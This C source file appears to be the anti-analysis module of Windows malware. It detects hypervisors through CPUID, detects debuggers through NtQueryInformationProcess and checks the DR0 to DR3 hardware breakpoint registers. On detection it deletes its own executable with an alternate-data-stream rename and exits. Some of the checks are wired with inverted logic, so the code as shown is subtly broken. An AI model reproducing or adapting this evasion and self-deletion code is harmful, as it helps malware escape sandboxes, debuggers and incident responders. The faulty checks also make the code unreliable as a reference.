#include "Common.h"

// -=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
// -=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=

BOOLEAN DeleteCurrentFile(void)
{

	//------------------------------------------------------

	NTSTATUS						Status						= STATUS_SUCCESS;
	BOOLEAN							State						= TRUE;

	PVOID							Ntdll						= NULL;
	PVOID							FileHandle					= NULL;
	SIZE_T							RenameSize					= 0;
	PFILE_RENAME_INFO				FileRename					= { 0 };
	IO_STATUS_BLOCK					iosb						= { 0 };
	FILE_DISPOSITION_INFORMATION_EX FileDisposition				= { 0 };

	LPCWSTR							Stream						= L":TKYN";
	PWSTR							RunningFilePath[MAX_PATH]	= { 0 };

	//------------------------------------------------------

	pGetModuleFileNameW(NULL, (LPWSTR)RunningFilePath, MAX_PATH);

	//------------------------------------------------------

	if ((FileHandle = pCreateFileW((LPCWSTR)RunningFilePath, (DELETE | SYNCHRONIZE), FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL)) == INVALID_HANDLE_VALUE)
	{
#ifdef DEBUG
		PRINT_ERROR("CreateFileW");
#endif
		State = FALSE; goto _END_FUNC;
	}

	//------------------------------------------------------

	RenameSize = sizeof(FILE_RENAME_INFO) + sizeof(wchar_t) * (WCSLEN(Stream) + 1);
	FileRename = (PFILE_RENAME_INFO)HeapAlloc(pGetProcessHeap(), HEAP_ZERO_MEMORY, RenameSize);

	FileRename->FileNameLength = (DWORD)(WCSLEN(Stream) * sizeof(wchar_t));
	MEMCPY(FileRename->FileName, Stream, FileRename->FileNameLength);

	//------------------------------------------------------

	if (!pSetFileInformationByHandle(FileHandle, FileRenameInfo, FileRename, (DWORD)RenameSize))
	{
#ifdef DEBUG
		PRINT_ERROR("SetFileInformationByHandle");
#endif
		State = FALSE; goto _END_FUNC;
	}

	pCloseHandle(FileHandle);
	FileHandle = INVALID_HANDLE_VALUE;

	//------------------------------------------------------

	if ((FileHandle = pCreateFileW((LPCWSTR)RunningFilePath, (DELETE | SYNCHRONIZE), FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL)) == INVALID_HANDLE_VALUE)
	{
#ifdef DEBUG
		PRINT_ERROR("CreateFileW");
#endif
		State = FALSE; goto _END_FUNC;
	}

	//------------------------------------------------------

	FileDisposition.Flags = FILE_DISPOSITION_DELETE | FILE_DISPOSITION_POSIX_SEMANTICS;
	if (!NT_SUCCESS(pNtSetInformationFile(FileHandle, &iosb, &FileDisposition, sizeof(FileDisposition), FileDispositionInformationEx)))
	{
#ifdef DEBUG
		NT_ERROR("NtSetInformationFile");
#endif
		State = FALSE; goto _END_FUNC;
	}

	//------------------------------------------------------

_END_FUNC:

	if (FileHandle && FileHandle != INVALID_HANDLE_VALUE)
		CloseHandle(FileHandle);

	if (FileRename)
		HeapFree(GetProcessHeap(), 0, FileRename);

	return State;

}

// -=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
// -=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=

BOOLEAN IsRunningInVm(void)
{

	//------------------------------------------------------

	INT		CpuLeaf[4]		= { 0 };
	CHAR	Hypervisor[13]	= { 0 };

	CHAR MicrosoftHv[]	= { 'M','i','c','r','o','s','o','f','t',' ','H','v','\0'	};
	CHAR VmwareVmware[] = { 'V','m','w','a','r','e','V','m','w','a','r','e','\0'	};
	CHAR VBoxVBoxVBox[] = { 'V','B','o','x','V','B','o','x','V','B','o','x','\0'	};
	CHAR KVMKVMKVM[]	= { 'K','V','M','K','V','M','K','V','M','\0','\0','\0','\0' };
	CHAR XenVMMXenVMM[] = { 'X','e','n','V','M','M','X','e','n','V','M','M','\0'	};
	CHAR PrlHyperv[]	= { 'p','r','l',' ','h','y','p','e','r','v','\0','\0','\0'	};

	//------------------------------------------------------

	__cpuid(CpuLeaf, 0x40000000);
	MEMSET(Hypervisor, 0, sizeof(Hypervisor));
	MEMCPY(Hypervisor, CpuLeaf + 1, 12);

	//------------------------------------------------------

	if (_stricmp(Hypervisor, MicrosoftHv	) == 0 ||
		_stricmp(Hypervisor, VmwareVmware	) == 0 ||
		_stricmp(Hypervisor, VBoxVBoxVBox	) == 0 ||
		_stricmp(Hypervisor, KVMKVMKVM		) == 0 ||
		_stricmp(Hypervisor, XenVMMXenVMM	) == 0 ||
		_stricmp(Hypervisor, PrlHyperv		) == 0
		)
	{
		return FALSE; // vm detected
	}

	//------------------------------------------------------

	return TRUE;

}

// -=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
// -=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=

BOOLEAN IsHwBpEnabled(void)
{

	//------------------------------------------------------

	HANDLE	ThreadHandle	= NtCurrentThread();
	CONTEXT ThreadCtx		= { .ContextFlags = CONTEXT_ALL };

	//------------------------------------------------------

	GetThreadContext(ThreadHandle, &ThreadCtx);

	if (ThreadCtx.Dr0 != NULL || ThreadCtx.Dr1 != NULL || ThreadCtx.Dr2 != NULL || ThreadCtx.Dr3 != NULL)
		return TRUE;

	//------------------------------------------------------

	return FALSE;

	//------------------------------------------------------

}

// -=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
// -=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=

BOOLEAN IsRunningInDebugger(void)
{

	//------------------------------------------------------

	NTSTATUS		Status				= STATUS_SUCCESS;
	ULONG_PTR		ProcessInformation	= 0;
	ULONG			ProcessDebugFlag	= 0;
	HANDLE			DebugObject			= NULL;

	//------------------------------------------------------

	if (!NT_SUCCESS(Status = pNtQueryInformationProcess(NtCurrentProcess(), ProcessDebugPort, &ProcessInformation, sizeof(ULONG_PTR), NULL)))
	{
		NT_ERROR("NtQueryInformationProcess");
		return FALSE;
	}

	if (ProcessInformation != 0)
		return TRUE;

	//------------------------------------------------------

	if (!NT_SUCCESS(Status = pNtQueryInformationProcess(NtCurrentProcess(), ProcessDebugFlags, &ProcessDebugFlag, sizeof(ULONG), NULL)))
	{
		NT_ERROR("NtQueryInformationProcess");
		return FALSE;
	}

	if (ProcessDebugFlag == 0)
		return TRUE;

	//------------------------------------------------------

	if (!NT_SUCCESS(Status = pNtQueryInformationProcess(NtCurrentProcess(), ProcessDebugObjectHandle, &DebugObject, sizeof(PVOID), NULL)))
	{
		NT_ERROR("NtQueryInformationProcess");
		return FALSE;
	}

	if (DebugObject != NULL)
	{
		pCloseHandle(DebugObject);
		return TRUE;
	}

	//------------------------------------------------------

	return FALSE;

	//------------------------------------------------------

}

// -=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
// -=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=

VOID CheckForAnalysis(void)
{

	if (!IsRunningInVm())
	{
#ifdef DEBUG
		WARN("Currently Running in a Virtualized Environment!");
#endif
		DeleteCurrentFile();
		ExitProcess(0);
	}

	if (!IsRunningInDebugger())
	{
#ifdef DEBUG
		WARN("Program currently Executing in a Debugger!");
#endif
		DeleteCurrentFile();
		ExitProcess(0);
	}

	if (!IsHwBpEnabled())
	{
#ifdef DEBUG
		WARN("DR0-DR3 Breakpoints have been enabled onto current process!");
#endif
		DeleteCurrentFile();
		ExitProcess(0);
	}

#ifdef DEBUG
	OKAY("Anti-Analysis Checks Passed!");
#endif

}